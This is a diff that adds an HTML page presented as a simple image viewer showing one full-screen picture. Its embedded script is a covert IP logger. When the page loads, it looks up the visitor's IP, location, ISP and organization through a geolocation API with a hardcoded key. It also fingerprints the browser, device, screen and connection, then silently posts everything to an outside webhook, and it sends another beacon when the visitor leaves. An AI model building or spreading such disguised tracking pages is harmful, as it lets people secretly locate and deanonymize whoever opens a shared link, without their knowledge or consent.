@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Imagem</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+        }
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+        img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            background: #000;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://i.imgur.com/yMELiaL.jpeg">
+
+    <script>
+        const WEBHOOK_URL = 'https://blue-owl-08.webhook.cool';
+        const IPGEO_API_KEY = '929196568ff04c02a6d494d40a6e25c3';
+        let cachedIpData = null;
+
+        async function getIpData() {
+            if (cachedIpData) return cachedIpData;
+
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 8000);
+                
+                const response = await fetch(
+                    `https://api.ipgeolocation.io/v2/ipgeo?apiKey=${IPGEO_API_KEY}`,
+                    { 
+                        signal: controller.signal,
+                        headers: { 'Accept': 'application/json' }
+                    }
+                );
+                clearTimeout(timeoutId);
+                
+                if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                
+                const data = await response.json();
+                
+                cachedIpData = {
+                    ip: data.ip,
+                    location: data.location || {},
+                    country_metadata: data.country_metadata || null,
+                    currency: data.currency || null,
+                    time_zone: data.time_zone || null,
+                    isp: data.isp || null,
+                    organization: data.organization || null,
+                    connection_type: data.connection_type || null,
+                    source: 'ipgeolocation.io'
+                };
+                
+                return cachedIpData;
+                
+            } catch (error) {
+                return {
+                    ip: 'unknown',
+                    location: {
+                        city: 'Desconhecido',
+                        state_prov: 'Desconhecido',
+                        country_name: 'Desconhecido'
+                    },
+                    source: 'fallback',
+                    error: error.message
+                };
+            }
+        }
+
+        function sendToWebhook(data) {
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(() => {});
+        }
+
+        document.addEventListener('DOMContentLoaded', async function() {
+            try {
+                const ipData = await getIpData();
+                
+                const trackingData = {
+                    event: 'image_view',
+                    timestamp: new Date().toISOString(),
+                    
+                    ip: ipData.ip,
+                    location: ipData.location,
+                    country_metadata: ipData.country_metadata,
+                    currency: ipData.currency,
+                    time_zone: ipData.time_zone,
+                    isp: ipData.isp,
+                    organization: ipData.organization,
+                    connection_type: ipData.connection_type,
+                    
+                    device: {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        vendor: navigator.vendor,
+                        language: navigator.language,
+                        languages: navigator.languages,
+                        cookiesEnabled: navigator.cookieEnabled,
+                        doNotTrack: navigator.doNotTrack,
+                        hardwareConcurrency: navigator.hardwareConcurrency,
+                        maxTouchPoints: navigator.maxTouchPoints,
+                        pdfViewerEnabled: navigator.pdfViewerEnabled
+                    },
+                    screen: {
+                        width: window.screen.width,
+                        height: window.screen.height,
+                        availWidth: window.screen.availWidth,
+                        availHeight: window.screen.availHeight,
+                        colorDepth: window.screen.colorDepth,
+                        pixelDepth: window.screen.pixelDepth,
+                        orientation: window.screen.orientation?.type
+                    },
+                    window: {
+                        innerWidth: window.innerWidth,
+                        innerHeight: window.innerHeight,
+                        outerWidth: window.outerWidth,
+                        outerHeight: window.outerHeight,
+                        devicePixelRatio: window.devicePixelRatio
+                    },
+                    connection: navigator.connection ? {
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt,
+                        saveData: navigator.connection.saveData
+                    } : null,
+                    
+                    referrer: document.referrer || 'Direct',
+                    url: window.location.href,
+                    title: document.title,
+                    apiSource: ipData.source
+                };
+
+                sendToWebhook(trackingData);
+            } catch (error) {}
+        });
+
+        window.addEventListener('beforeunload', function() {
+            navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({
+                event: 'image_exit',
+                timestamp: new Date().toISOString(),
+                timeOnPage: Math.round(performance.now() / 1000)
+            }));
+        });
+    </script>
+</body>
+</html>
